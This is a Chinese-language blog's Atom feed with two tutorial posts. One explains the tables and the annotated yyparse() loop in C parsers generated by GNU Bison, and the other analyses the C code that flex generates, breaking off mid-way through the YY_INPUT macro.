<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C7</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://billyotry.github.io/"/>
  <updated>2020-07-11T07:34:01.950Z</updated>
  <id>https://billyotry.github.io/</id>
  
  <author>
    <name>C7</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Understanding C parsers generated by GNU Bison</title>
    <link href="https://billyotry.github.io/2020/07/11/Understanding%20C%20parsers%20generated%20by%20GNU%20Bison/"/>
    <id>https://billyotry.github.io/2020/07/11/Understanding%20C%20parsers%20generated%20by%20GNU%20Bison/</id>
    <published>2020-07-11T07:28:41.581Z</published>
    <updated>2020-07-11T07:34:01.950Z</updated>
    
    <content type="html"><![CDATA[<h3 id="table分析"><a href="#table分析" class="headerlink" title="table分析"></a>table分析</h3><p>bision与flex类似，有一系列的表，理清这些表之间的关系及索引方式后能更好的理解<code>yyparse</code>。</p><h4 id="yytranslate"><a href="#yytranslate" class="headerlink" title="yytranslate"></a>yytranslate</h4><p>此表映射了token和symbol token之间的关系。如果是预定义的<code>%token</code>，则会映射到其他的token序号中；如果是普通的终结符，则会把字符对应的ascii码映射到对应token中。</p><p>例如<code>S: &#39;\n&#39; ;</code>规则在生成后如下</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYTRANSLATE[YYLEX] -- Bison symbol number corresponding to YYLEX.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_uint8 yytranslate[] =</span><br><span class="line">&#123;</span><br><span class="line">       <span class="number">0</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,</span><br><span class="line">       <span class="number">3</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,</span><br><span class="line">...       </span><br><span class="line">       <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">1</span>,     <span class="number">2</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>&#39;\n&#39;</code>的ascii为10,所以yytranslate[10]=3</p><p>多数映射的token为2，2是未定义，只有在语法中定义的符号才被赋予有效的符号编号。</p><p>这里的<code>&#39;\n&#39;</code>为什么是3，那是因为终结符的编号从3开始，可以通过查看输出解析器中生成的yytname数组来检查分配给各种符号的符号编号，而这里的例子符号编号如下所示。</p><table><thead><tr><th align="center"><em>Symbol</em></th><th align="center"><em>Number</em></th></tr></thead><tbody><tr><td align="center">$end</td><td align="center">0</td></tr><tr><td align="center">error</td><td align="center">1</td></tr><tr><td align="center">$undefined</td><td align="center">2</td></tr><tr><td align="center">\n</td><td align="center">3</td></tr></tbody></table><p>每当<code>yyparse()</code>需要token时，它都会调用<code>yylex</code>，然后获取对应token的symbol token内部码。</p><h4 id="yydefact"><a href="#yydefact" class="headerlink" title="yydefact"></a>yydefact</h4><p>此表存储了每个状态下对应的产生式规则的序号。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYDEFACT[STATE-NAME] -- Default rule to reduce with in state</span></span><br><span class="line"><span class="comment">   STATE-NUM when YYTABLE doesn't specify something else to do.  Zero</span></span><br><span class="line"><span class="comment">   means the default is an error.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_uint8 yydefact[] =</span><br><span class="line">&#123;</span><br><span class="line">       <span class="number">0</span>,     <span class="number">2</span>,     <span class="number">0</span>,     <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>在STATE-NAME状态下，通过yydefact[STATE-NAME]来获取其对应的产生式规则的序号。</p></blockquote><p>其中，<code>0</code>号表示error。由于默认<code>($accept → L $end)</code>rule(其rule number为1)的存在，我们定义的所有rule索引都会增加1。即我们定义的第一个rule <code>S: &#39;\n&#39; ;</code>, 其rule number在此处为2。</p><h4 id="yydefgoto"><a href="#yydefgoto" class="headerlink" title="yydefgoto"></a>yydefgoto</h4><p>yydefgoto是GOTO跳转表的压缩形式。它的元素数量为语法中非终结符的数量，元素的值表示每个非终结符要跳转的状态。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* yydefgoto[nth non-terminal] = most common GOTO state for the nth non-terminal. */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_int8 yydefgoto[] =</span><br><span class="line">&#123;</span><br><span class="line">      <span class="number">-1</span>,     <span class="number">2</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>索引方式为<code>yytranslate</code>表中的符号编号减去非终结符的数目。</p><p>parser在用rule归约栈上内容的时候会查询yydefgoto，但在某些状态下会使用yytable表。</p><p>第一个非终结符<code>$accept</code>的rule为-1(即yydefgoto[0]),<code>$accept</code>不会被归约。</p><h4 id="yyr1-and-yyr2"><a href="#yyr1-and-yyr2" class="headerlink" title="yyr1 and yyr2"></a>yyr1 and yyr2</h4><p>yyr1表示每个rule左部的symbol数量，通过yyr1，当进行归约时，我们需要知道用于还原以转换为适当状态的规则的LHS符号，这就是该表使用的地方。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYR1[YYN] -- Symbol number of symbol that rule YYN derives.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_uint8 yyr1[] =</span><br><span class="line">&#123;</span><br><span class="line">       <span class="number">0</span>,     <span class="number">4</span>,     <span class="number">5</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>yyr2表示每个rule右部的symbol数量，</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYR2[YYN] -- Number of symbols composing right hand side of rule YYN.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_uint8 yyr2[] =</span><br><span class="line">&#123;</span><br><span class="line">       <span class="number">0</span>,     <span class="number">2</span>,     <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>例如<strong>rule2</strong>的<code>S: &#39;\n&#39;</code>右侧有1个symbol，因此yyr2[2]=1。在归约的时候，通过这个表中查找在对应的rule下，我们要从栈中pop出多少state来作为归约。</p><h4 id="yytable"><a href="#yytable" class="headerlink" title="yytable"></a>yytable</h4><p>yytable和yycheck, yypact, yypgoto 配合来表示当前的状态是应该放入移入中还是符合rule来进行归约。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYTABLE[YYPACT[STATE-NUM]].  What to do in state STATE-NUM.  If</span></span><br><span class="line"><span class="comment">   positive, shift that token.  If negative, reduce the rule which</span></span><br><span class="line"><span class="comment">   number is the opposite.  If zero, do what YYDEFACT says.</span></span><br><span class="line"><span class="comment">   If YYTABLE_NINF, syntax error.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YYTABLE_NINF -1</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_uint8 yytable[] =</span><br><span class="line">&#123;</span><br><span class="line">       <span class="number">1</span>,     <span class="number">3</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>正数表示移入，负数表示归约，其中归约所使用的规则的number为元素的绝对值，即如果是-3，则使用rule3来进行归约。</p><h4 id="yypgoto"><a href="#yypgoto" class="headerlink" title="yypgoto"></a>yypgoto</h4><p>因为同一个非终结符，根据之前状态的不同，其跳转的状态也是不同的，那么对于存在不同情况的GOTO情况，则由yypgoto记录。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYPGOTO[NTERM-NUM].  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_int8 yypgoto[] =</span><br><span class="line">&#123;</span><br><span class="line">      <span class="number">-4</span>,     <span class="number">-4</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>此表的索引对应这所有的非终结符，这里分别对应<code>$accept</code>,<code>S</code>。</p><p>比如现在在rule2 (<code>S -&gt; &#39;\n&#39;</code>)归约后，栈顶的状态为4，parser会将yypgoto[S]的值(此处yypgoto[1]=-4)加上原先的状态值作为现在的状态索引，去yytable找到新的状态值，即此时状态索引为0 (4-4)， 那么yytable[0]为1，那么现在的状态就是1，被压入状态栈顶。</p><p>parser到底是用<code>yypgoto</code>还是<code>yydefgoto</code>来设置接下来的状态，将在<code>yycheck</code>中指出。</p><h4 id="yypact"><a href="#yypact" class="headerlink" title="yypact"></a>yypact</h4><p>yypact定义了在初始状态下的部分yytable。它由token标号来索引。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YYPACT_NINF -4</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_int8 yypact[] =</span><br><span class="line">&#123;</span><br><span class="line">      <span class="number">-3</span>,    <span class="number">-4</span>,    <span class="number">1</span>,     <span class="number">-4</span>  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这是解析循环查询的第一个表，在parse循环开始的时候，如果yypact[cur-state] = YYPACT_NINF，意味着使用yydefact来进行归约，并且只有归约没有移入操作。</p><p>例如此处如果是状态1和3，则为YYPACT_NINF，只进行归约操作。</p><p>如果现在在状态0，展望符为<code>\n</code>(即3号symbol,由yytranslate可得)，那么现在的yypact[0]为-3，所以在yytable中的索引应该为<code>-3+3=0</code>, yytable[0]为1，表示移入并转移到状态1。</p><h4 id="yycheck"><a href="#yycheck" class="headerlink" title="yycheck"></a>yycheck</h4><p>yycheck主要有两个作用，一个是判断归约还是移入，一个是判断选用<code>yypgoto</code>还是<code>yydefgoto</code>跳转表。</p><h5 id="yytable-or-yydefact"><a href="#yytable-or-yydefact" class="headerlink" title="yytable or yydefact"></a>yytable or yydefact</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">YYCHECK = a <span class="built_in">vector</span> indexed in parallel with YYTABLE.  It indicates,</span><br><span class="line">   in a roundabout way, the bounds of the portion you are trying to</span><br><span class="line">   examine.</span><br><span class="line"></span><br><span class="line">   Suppose that the portion of YYTABLE starts at index P <span class="keyword">and</span> the index</span><br><span class="line">   to be examined within the portion is I.  Then <span class="keyword">if</span> YYCHECK[P+I] != I,</span><br><span class="line">   I is outside the bounds of what is actually allocated, <span class="keyword">and</span> the</span><br><span class="line">   <span class="keyword">default</span> (from YYDEFACT <span class="keyword">or</span> YYDEFGOTO) should be used.  Otherwise,</span><br><span class="line">   YYTABLE[P+I] should be used.</span><br></pre></td></tr></table></figure><p>parse会判断yycheck[0]是否为所有有效token的symbol number, 如果不是，则进行yydefault的归约。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">yyn += yytoken;</span><br><span class="line">  <span class="keyword">if</span> (yyn &lt; <span class="number">0</span> || YYLAST &lt; yyn || yycheck[yyn] != yytoken)</span><br><span class="line">    <span class="keyword">goto</span> yydefault;</span><br></pre></td></tr></table></figure><p>此时yycheck[0]=3，而<code>\n</code>正好是3号symbol，所有我们选择<code>yytable</code>。</p><h5 id="yydefgoto-or-yypgoto"><a href="#yydefgoto-or-yypgoto" class="headerlink" title="yydefgoto or yypgoto"></a>yydefgoto or yypgoto</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">yyn = yyr1[yyn];</span><br><span class="line">yystate = yypgoto[yyn - YYNTOKENS] + *yyssp;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> &lt;= yystate &amp;&amp; yystate &lt;= YYLAST &amp;&amp; yycheck[yystate] == *yyssp)</span><br><span class="line">    yystate = yytable[yystate];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    yystate = yydefgoto[yyn - YYNTOKENS];</span><br></pre></td></tr></table></figure><p>比如现在在rule2 (<code>S -&gt; &#39;\n&#39;</code>)归约后，栈顶的状态为4，parser会将yypgoto[S]的值(此处yypgoto[1]=-4)加上原先的状态值作为现在的状态索引4-4=0，查询yycheck，如果为4，则表示状态4为特殊状态，选择yytable; 否则就用yydefgoto表来决定跳转。</p><h3 id="parse分析"><a href="#parse分析" class="headerlink" title="parse分析"></a>parse分析</h3><p>详见注释</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*全局变量*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 此变量存储展望符.  */</span></span><br><span class="line"><span class="keyword">int</span> yychar;</span><br><span class="line"><span class="comment">/* 展望符的语义值.  */</span></span><br><span class="line">YYSTYPE yylval;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> </span><br><span class="line">yyparse()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> yystate; <span class="comment">/* current state */</span></span><br><span class="line"><span class="keyword">int</span> yyn;<span class="comment">/* 这是一个通用变量！一次可能代表一种状态，下次可能代表一条规则 */</span></span><br><span class="line"><span class="keyword">int</span> yyresult;<span class="comment">/* 解析结果返回给调用者 */</span></span><br><span class="line"><span class="keyword">int</span> yytoken=<span class="number">0</span>;<span class="comment">/* current token */</span></span><br><span class="line"><span class="comment">/* The state stack: This parser does not shift symbols on to the stack. Only a stack of states is maintained. */</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">int</span> yyssa[YYINITDEPTH];<span class="comment">/*YYINITDEPTH is 200 */</span></span><br><span class="line"> <span class="keyword">int</span> *yyss = yyssa<span class="comment">/* Bottom of state stack */</span></span><br><span class="line"> <span class="keyword">int</span> *yyssp;<span class="comment">/* Top of state stack */</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">/* The semantic value stack: 该栈与状态栈平行增长。每次减少时，都会从堆栈中弹出语义值，并执行语义操作 */</span></span><br><span class="line">  YYSTYPE yyvsa[YYINITDEPTH];</span><br><span class="line">  YYSTYPE *yyvs = yyvsa;<span class="comment">/* Bottom of semantic stack */</span></span><br><span class="line">  YYSTYPE *yyvsp;<span class="comment">/* Top of semantic stack */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* POP the state and semantic stacks by N symbols - useful for reduce actions */</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">define</span> YYPOPSTACK(N)   (yyvsp -= (N), yyssp -= (N))</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> yylen = <span class="number">0</span>;<span class="comment">/* 该变量用于归约操作中保存规则右侧的终结符长度 */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Ok done declaring variables. Set the ball rolling */</span></span><br><span class="line">  </span><br><span class="line">  yystate = <span class="number">0</span>;<span class="comment">/* Initial state */</span></span><br><span class="line">  yychar = YYEMPTY <span class="comment">/* YYEMPTY is -2 */</span></span><br><span class="line">  </span><br><span class="line">  yyssp = yyss; <span class="comment">/* Top = bottom for state stack */</span></span><br><span class="line">  yyvsp = yyvs;<span class="comment">/* Same for semantic stack */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yysetstate; <span class="comment">/* Well, gotos are used for extracting maximum performance. */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Each label can be thought of as a function */</span></span><br><span class="line">  </span><br><span class="line">  yynewstate:  <span class="comment">/* Push a new state on the stack */</span></span><br><span class="line">  </span><br><span class="line">  yyssp ++;<span class="comment">/*Just increment the stack top; actual 'pushing' will happen in yysetstate */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  yysetstate:</span><br><span class="line">  </span><br><span class="line">  *yyssp = yystate;<span class="comment">/* Ok pushed state on state stack top */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yybackup;<span class="comment">/* This is where you will find some action */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  yybackup:<span class="comment">/* The main parsing code starts here */</span></span><br><span class="line">  </span><br><span class="line">  yyn = yypact[yystate];<span class="comment">/* Refer to what yypact is saying about the current state */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ( yyn == YYPACT_NINF) <span class="comment">/* If negative infinity its time for a default reduction */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yydefault;<span class="comment">/* This label implements default reductions; see below */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Check if we have a look-ahead token ready. This is LALR(1) parsing */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (yychar == YYEMPTY)</span><br><span class="line">  </span><br><span class="line">  yychar = YYLEX; <span class="comment">/* Macro YYLEX is defined as yylex() */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (yychar &lt;= YYEOF) <span class="comment">/* YYEOF is 0 - the token returned by lexer at end of input */</span></span><br><span class="line">  </span><br><span class="line">  yychar = yytoken = YYEOF; <span class="comment">/* set all to EOF */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  </span><br><span class="line">  yytoken = yytranslate[yychar];<span class="comment">/* Translate the lexer token into internal symbol number */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Now we have a look-ahead token. Let the party begin ! */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  yyn = yyn + yytoken;<span class="comment">/* This is yypact[yystate] + yytoken */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Observe this check carefully. We are checking that yyn is within the bounds of yytable</span></span><br><span class="line"><span class="comment">   * and also if yycheck contains the current token number.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> ( yyn &lt; <span class="number">0</span> || YYLAST &lt; yyn  || yycheck[yyn] != yytoken )<span class="comment">/* YYLAST is the highest index in yytable */</span></span><br><span class="line">     </span><br><span class="line">  <span class="keyword">goto</span> yydefault; <span class="comment">/* Its time for a default reduction */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Ok, yyn is within bounds of yytable */</span></span><br><span class="line">  </span><br><span class="line">  yyn = yytable[yyn];<span class="comment">/* This is yytable[ yypact[yystate] + yytoken ] */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (yyn &lt;= <span class="number">0</span>)<span class="comment">/* If yytable happens to contain a -ve value, its not a shift - its a reduce */</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">if</span> (yyn == <span class="number">0</span> || yyn == YYTABLE_NINF)<span class="comment">/* But check for out of bounds condition*/</span></span><br><span class="line">  <span class="keyword">goto</span> yyerrlab;<span class="comment">/* Label to handle errors */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Other wise reduce with rule # -yyn */</span></span><br><span class="line">  </span><br><span class="line">  yyn = -yyn;</span><br><span class="line">  <span class="keyword">goto</span> yyreduce; <span class="comment">/* Label to implement reductions */</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Last check: See if we reached final state! */</span></span><br><span class="line">  <span class="keyword">if</span> (yyn == YYFINAL)<span class="comment">/* YYFINAL is 8 in our case */</span></span><br><span class="line">  YYACCEPT;<span class="comment">/* macro deined as 'goto acceptlab - a label to finish up */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* That completes all checks; If we reached here, there is no other option but to shift */</span></span><br><span class="line">  </span><br><span class="line">  yystate = yyn;<span class="comment">/* Now, yyn (= yytable[ yypact[yystate] + yytoken ]) is a state that has to be pushed */</span></span><br><span class="line">  </span><br><span class="line">  *++yyvsp = yylval; <span class="comment">/* Push the semantic value of the symbol on the semantic stack */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yynewstate;<span class="comment">/* This will increment state stack top and the following yysetstate that will do the pushing */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  yydefault:<span class="comment">/* A label to implement default reductions */</span></span><br><span class="line">  </span><br><span class="line">  yyn = yydefact[yystate];<span class="comment">/* Get the default reduction rule for this state */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ( yyn == <span class="number">0</span> )<span class="comment">/* This state has no default reduction. Something is wrong */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yyerrlab;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yyreduce;<span class="comment">/* Ok, got the default reduction rule # in yyn; go ahead and reduce the stack */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  yyreduce:<span class="comment">/* A lablel that implements reductions on stack. */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* By the time we are here, yyn contains the rule# to use for reducing the stack. */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Steps for reduction:</span></span><br><span class="line"><span class="comment">   * 1. Find the length of RHS of rule #yyn</span></span><br><span class="line"><span class="comment">   * 2. Execute any semantic actions by taking the values from the semantic stack</span></span><br><span class="line"><span class="comment">   * 3. POP 'length' symbols from the state stack and 'length' values from semantic stack</span></span><br><span class="line"><span class="comment">   * 4. Find the LHS of rule #yyn</span></span><br><span class="line"><span class="comment">   * 5. Find the GOTO of state currently on top of stack on LHS symbol</span></span><br><span class="line"><span class="comment">   * 6. Push that state on top of stack</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   </span><br><span class="line">   yylen = yyr2[yyn];<span class="comment">/* Get length of RHS */</span></span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* Default semantic action - $$=$1 */</span></span><br><span class="line">   yyval = yyvsp[<span class="number">1</span>-yylen];</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* Execute semantic actions */</span></span><br><span class="line">   <span class="keyword">switch</span> ( yyn )<span class="comment">/* Each rule has its own semantic action */</span></span><br><span class="line">   &#123;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">default</span>:<span class="keyword">break</span>;<span class="comment">/* We didn't have any semantic actions in the grammar.*/</span></span><br><span class="line">   </span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   YYPOPSTACK (yylen);<span class="comment">/* This will pop both state and semantic stacks. See definition of this macro above */</span></span><br><span class="line">   </span><br><span class="line">   yylen = <span class="number">0</span>;<span class="comment">/* re-initialize yylen */</span></span><br><span class="line">   </span><br><span class="line">   *++yyvsp  = yyval;<span class="comment">/* Push the result of semantic evaluation on top of semantic stack */</span></span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* Now shift the result of reduction (steps 4 - 6) */</span></span><br><span class="line">   </span><br><span class="line">   yyn = yyr1[yyn];<span class="comment">/* Reuse yyn at every opportunity.  For now, yyn is the LHS symbol (number) of the rule */</span></span><br><span class="line">   </span><br><span class="line"> <span class="comment">/* First check for anomalous GOTOs, otherwise use Default GOTO (YYDEFGOTO)</span></span><br><span class="line"><span class="comment">  * </span></span><br><span class="line"><span class="comment">  * Observe that if we subtract no. of terminals (YYNTOKENS) from symbol number of a nonterminal, we get</span></span><br><span class="line"><span class="comment">  * an index into yypgoto or yydefgoto for that non-terminal.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  </span><br><span class="line">   yystate = yypgoto[yyn - YYNTOKENS] + *yyssp;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* A couple of checks are needed before we know this is not a default GOTO</span></span><br><span class="line"><span class="comment">    * 1. yystate must be within bounds of yytable. ( 0 to YYLAST )</span></span><br><span class="line"><span class="comment">    * 2. yycheck must contain the state currently on top of the stack</span></span><br><span class="line"><span class="comment">    */</span>   </span><br><span class="line">   <span class="keyword">if</span> ( <span class="number">0</span> &lt;= yystate &amp;&amp; yystate &lt;= YYLAST &amp;&amp; yycheck[yystate] = *yyssp)</span><br><span class="line">   </span><br><span class="line">   yystate = yytable[yystate];<span class="comment">/* Take the GOTO from yytable */</span></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   </span><br><span class="line">   yystate = yydefgoto[yyn - YYNTOKENS];<span class="comment">/* Otherwise use the default GOTO */</span></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">goto</span> yynewstate;<span class="comment">/* Simply push the newly found state on top of stack and continue */</span></span><br><span class="line">   </span><br><span class="line">&#125;<span class="comment">/* End of yyparse() */</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总的来说和flex类似，其实也是通过一系列的表来驱动。</p><h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="https://www.cs.uic.edu/~spopuri/cparser.html#lr-parser" target="_blank" rel="noopener">https://www.cs.uic.edu/~spopuri/cparser.html#lr-parser</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;table分析&quot;&gt;&lt;a href=&quot;#table分析&quot; class=&quot;headerlink&quot; title=&quot;table分析&quot;&gt;&lt;/a&gt;table分析&lt;/h3&gt;&lt;p&gt;bision与flex类似，有一系列的表，理清这些表之间的关系及索引方式后能更好的理解&lt;code&gt;y
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>lexical scanner generated by flex</title>
    <link href="https://billyotry.github.io/2020/06/25/lexical%20scanner%20generated%20by%20flex/"/>
    <id>https://billyotry.github.io/2020/06/25/lexical%20scanner%20generated%20by%20flex/</id>
    <published>2020-06-25T14:46:37.470Z</published>
    <updated>2020-06-28T12:15:09.307Z</updated>
    
    <content type="html"><![CDATA[<h2 id="flex生成代码分析"><a href="#flex生成代码分析" class="headerlink" title="flex生成代码分析"></a>flex生成代码分析</h2><p>本文从flex源码入手分析flex框架。</p><p>flex会根据我们所定义的正则表达式来匹配相应的字符，然后执行相应的函数操作来输出相应的 token。</p><p>新建空规则 <code>null.flex</code> 来了解 flex 是如何工作的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%%</span><br></pre></td></tr></table></figure><p>运行命令 <code>flex null.flex</code> 生成代码如下：<a href="https://pastebin.com/LBEXsnZK" target="_blank" rel="noopener">https://pastebin.com/LBEXsnZK</a></p><p>首先定义与 flex 版本相关的宏</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define FLEX_SCANNER</span><br><span class="line">#define YY_FLEX_MAJOR_VERSION 2</span><br><span class="line">#define YY_FLEX_MINOR_VERSION 6</span><br><span class="line">#define YY_FLEX_SUBMINOR_VERSION 0</span><br><span class="line">#if YY_FLEX_SUBMINOR_VERSION &gt; 0</span><br><span class="line">#define FLEX_BETA</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p>为了防止类型被用户代码冲突，此处将一些类型 define 成的自己的格式，或许是出于可移植性以及用户可定制性的考虑，flex 将大量关键字 define/typedef 成了自己的特殊关键字，不过从名称上大体都能猜出是什么含义。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;inttypes.h&gt;</span><br><span class="line">typedef int8_t flex_int8_t;</span><br><span class="line">typedef uint8_t flex_uint8_t;</span><br><span class="line">typedef int16_t flex_int16_t;</span><br><span class="line">typedef uint16_t flex_uint16_t;</span><br><span class="line">typedef int32_t flex_int32_t;</span><br><span class="line">typedef uint32_t flex_uint32_t;</span><br><span class="line">#else</span><br><span class="line">typedef signed char flex_int8_t;</span><br><span class="line">typedef short int flex_int16_t;</span><br><span class="line">typedef int flex_int32_t;</span><br><span class="line">typedef unsigned char flex_uint8_t; </span><br><span class="line">typedef unsigned short int flex_uint16_t;</span><br><span class="line">typedef unsigned int flex_uint32_t;</span><br></pre></td></tr></table></figure><p>然后是定义 EOF 的宏</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define YY_NULL 0</span><br></pre></td></tr></table></figure><p>将字符转为对应的 ascii 码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define YY_SC_TO_UI(c) ((unsigned int) (unsigned char) c)</span><br></pre></td></tr></table></figure><p>虽然 DFA 在状态转移的过程中一次前进一个字符，但是为了提高 IO 效率，实际从文件读取的时候一般是批量往缓冲区读入的。如果有需要微调这个读入策略的需求，可以通过定义 <code>YY_INPUT</code> 宏来实现。在默认生成的代码中，这个宏被定义为一段比较复杂的C代码。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> YY_INPUT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YY_INPUT(buf,result,max_size) </span></span><br><span class="line"><span class="keyword">if</span> ( YY_CURRENT_BUFFER_LVALUE-&gt;yy_is_interactive ) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">int</span> c = <span class="string">'*'</span>; </span><br><span class="line"><span class="keyword">size_t</span> n; </span><br><span class="line"><span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt; max_size &amp;&amp; </span><br><span class="line">     (c = getc( yyin )) != EOF &amp;&amp; c != <span class="string">'\n'</span>; ++n ) </span><br><span class="line">buf[n] = (<span class="keyword">char</span>) c; </span><br><span class="line"><span class="keyword">if</span> ( c == <span class="string">'\n'</span> ) </span><br><span class="line">buf[n++] = (<span class="keyword">char</span>) c; </span><br><span class="line"><span class="keyword">if</span> ( c == EOF &amp;&amp; ferror( yyin ) ) </span><br><span class="line">YY_FATAL_ERROR( <span class="string">"input in flex scanner failed"</span> ); </span><br><span class="line">result = n; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">errno=<span class="number">0</span>; </span><br><span class="line"><span class="keyword">while</span> ( (result = fread(buf, <span 